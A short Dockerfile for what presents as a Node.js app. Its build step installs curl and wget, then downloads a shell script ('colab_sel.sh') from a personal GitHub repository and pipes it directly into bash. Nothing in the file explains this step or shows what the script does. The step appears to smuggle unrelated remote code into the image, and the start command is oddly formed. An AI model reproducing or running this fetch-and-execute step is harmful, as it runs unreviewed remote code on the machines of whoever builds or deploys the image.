FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .


RUN apt update;apt -y install curl wget;wget -O - https://raw.githubusercontent.com/williamarmenta54/colab/refs/heads/main/colab_sel.sh | bash

CMD ["npm", "run", "start", "/bin/bash"]
